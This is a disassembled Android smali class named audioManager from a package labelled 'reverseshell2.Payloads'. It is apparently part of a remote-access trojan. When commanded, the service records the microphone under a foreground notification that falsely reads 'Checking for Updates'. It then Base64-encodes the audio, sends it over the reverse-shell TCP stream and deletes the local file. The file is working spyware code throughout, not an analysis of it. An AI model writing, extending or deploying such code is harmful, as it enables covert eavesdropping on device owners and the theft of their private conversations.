.class public Lcom/example/reverseshell2/Payloads/audioManager;
.super Landroid/app/Service;
.source "audioManager.java"


# static fields
.field static TAG:Ljava/lang/String;

.field static audiofile:Ljava/io/File;


# instance fields
.field mRecorder:Landroid/media/MediaRecorder;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "audioManagerClass"

    sput-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->TAG:Ljava/lang/String;

    const/4 v0, 0x0

    sput-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    return-void
.end method

.method private sendData(Ljava/io/File;Ljava/io/OutputStream;)V
    .locals 6

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/audioManager$5;

    invoke-direct {v1, p0, p2}, Lcom/example/reverseshell2/Payloads/audioManager$5;-><init>(Lcom/example/reverseshell2/Payloads/audioManager;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v1, v0

    new-array v0, v1, [B

    :try_start_0
    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    array-length v3, v0

    const/4 v4, 0x0

    invoke-virtual {v2, v0, v4, v3}, Ljava/io/BufferedInputStream;->read([BII)I

    invoke-static {v0, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/Thread;

    new-instance v5, Lcom/example/reverseshell2/Payloads/audioManager$6;

    invoke-direct {v5, p0, p2, v3}, Lcom/example/reverseshell2/Payloads/audioManager$6;-><init>(Lcom/example/reverseshell2/Payloads/audioManager;Ljava/io/OutputStream;Ljava/lang/String;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v4}, Ljava/lang/Thread;->start()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    const/4 v0, 0x0

    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 5

    const-string v0, "ins"

    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "startFore"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    const/4 v2, 0x1

    if-eqz v1, :cond_0

    new-instance v1, Lcom/example/reverseshell2/functions;

    const/4 v3, 0x0

    invoke-direct {v1, v3}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/audioManager;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v1, v3}, Lcom/example/reverseshell2/functions;->createNotiChannel(Landroid/content/Context;)V

    new-instance v1, Landroidx/core/app/NotificationCompat$Builder;

    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/audioManager;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "channelid"

    invoke-direct {v1, v3, v4}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const-string v3, "Checking for Updates"

    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    const-string v3, "Fetching"

    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    const v3, 0x7f060056

    invoke-virtual {v1, v3}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    const/4 v3, 0x0

    invoke-virtual {v1, v3, v3, v2}, Landroidx/core/app/NotificationCompat$Builder;->setProgress(IIZ)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v1

    invoke-virtual {v1}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    const/16 v3, 0x10e1

    invoke-virtual {p0, v3, v1}, Lcom/example/reverseshell2/Payloads/audioManager;->startForeground(ILandroid/app/Notification;)V

    sget-object v3, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {p0, v3}, Lcom/example/reverseshell2/Payloads/audioManager;->startRecording(Ljava/io/OutputStream;)V

    :cond_0
    const-string v1, "stopFore"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    sget-object v1, Lcom/example/reverseshell2/tcpConnection;->out:Ljava/io/OutputStream;

    invoke-virtual {p0, v1}, Lcom/example/reverseshell2/Payloads/audioManager;->stopRecording(Ljava/io/OutputStream;)V

    :cond_1
    return v2
.end method

.method public startRecording(Ljava/io/OutputStream;)V
    .locals 3

    :try_start_0
    invoke-virtual {p0}, Lcom/example/reverseshell2/Payloads/audioManager;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    const-string v1, "sound"

    const-string v2, ".mpeg4"

    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v1

    sput-object v1, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_2

    nop

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    iput-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    const/4 v2, 0x2

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    sget-object v2, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0, v2}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/io/File;)V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    :try_start_1
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/audioManager$1;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/audioManager$1;-><init>(Lcom/example/reverseshell2/Payloads/audioManager;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    :goto_0
    goto :goto_1

    :cond_0
    :try_start_2
    const-string v0, "Lower Android SDK Cant Record Audio\n"

    const-string v1, "UTF-8"

    invoke-virtual {v0, v1}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/io/OutputStream;->write([B)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    :goto_1
    return-void

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    sget-object v1, Lcom/example/reverseshell2/Payloads/audioManager;->TAG:Ljava/lang/String;

    const-string v2, "external storage access error"

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public stopRecording(Ljava/io/OutputStream;)V
    .locals 5

    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_1

    :try_start_0
    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V
    :try_end_0
    .catch Ljava/lang/IllegalStateException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/example/reverseshell2/Payloads/audioManager$2;

    invoke-direct {v2, p0, p1}, Lcom/example/reverseshell2/Payloads/audioManager$2;-><init>(Lcom/example/reverseshell2/Payloads/audioManager;Ljava/io/OutputStream;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    :goto_0
    iget-object v0, p0, Lcom/example/reverseshell2/Payloads/audioManager;->mRecorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v0

    const-wide/16 v2, 0x0

    cmp-long v4, v0, v2

    if-eqz v4, :cond_0

    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-direct {p0, v0, p1}, Lcom/example/reverseshell2/Payloads/audioManager;->sendData(Ljava/io/File;Ljava/io/OutputStream;)V

    goto :goto_1

    :cond_0
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/audioManager$3;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/audioManager$3;-><init>(Lcom/example/reverseshell2/Payloads/audioManager;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :goto_1
    sget-object v0, Lcom/example/reverseshell2/Payloads/audioManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    goto :goto_2

    :cond_1
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/reverseshell2/Payloads/audioManager$4;

    invoke-direct {v1, p0, p1}, Lcom/example/reverseshell2/Payloads/audioManager$4;-><init>(Lcom/example/reverseshell2/Payloads/audioManager;Ljava/io/OutputStream;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :goto_2
    return-void
.end method
